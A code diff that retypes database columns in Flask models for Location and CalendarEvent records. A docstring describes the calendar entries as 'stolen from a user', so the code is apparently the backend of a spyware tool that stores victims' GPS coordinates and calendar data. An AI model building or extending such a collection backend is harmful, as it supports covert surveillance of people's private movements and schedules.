@@ -102,27 +102,24 @@ class Location(db.Model):
     location_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
     user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
 
-    longitude = db.Column(db.String(64), nullable=False)
-    latitude = db.Column(db.String(64), nullable=False)
-    time_stamp = db.Column(db.String(64), nullable=False)
+    longitude = db.Column(db.Float, nullable=False)
+    latitude = db.Column(db.Float, nullable=False)
+    time_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
 
     @staticmethod
     def userdata_post_handler(user_id, location_data_dict):
         """Adds posted userdata to database"""
-        # Create contact
-
-        time_stamp = date.fromtimestamp(int(location_data_dict.get("time")))
         location = Location(
             user_id=int(user_id),
             longitude=location_data_dict.get("longitude"),
             latitude=location_data_dict.get("latitude"),
-            time_stamp=time_stamp,
+            time_utc_milliseconds=location_data_dict.get("timeInUTCMilliseconds"),
         )
         db.session.add(location)
         db.session.commit()
 
     def __repr__(self):
-        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_stamp, self.latitude, self.longitude)
+        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_utc_milliseconds, self.latitude, self.longitude)
 
 class CalendarEvent(db.Model):
     """Models a calendar entry stolen from a user"""
@@ -132,8 +129,8 @@ class CalendarEvent(db.Model):
 
     title = db.Column(db.String(64), nullable=False)
     event_location = db.Column(db.String(64), nullable=True)
-    start_utc_milliseconds = db.Column(db.String(64), nullable=True)
-    end_utc_milliseconds = db.Column(db.String(64), nullable=True)
+    start_utc_milliseconds = db.Column(db.BigInteger, nullable=True)
+    end_utc_milliseconds = db.Column(db.BigInteger, nullable=True)
 
     @staticmethod
     def userdata_post_handler(user_id, calendar_data_dict):
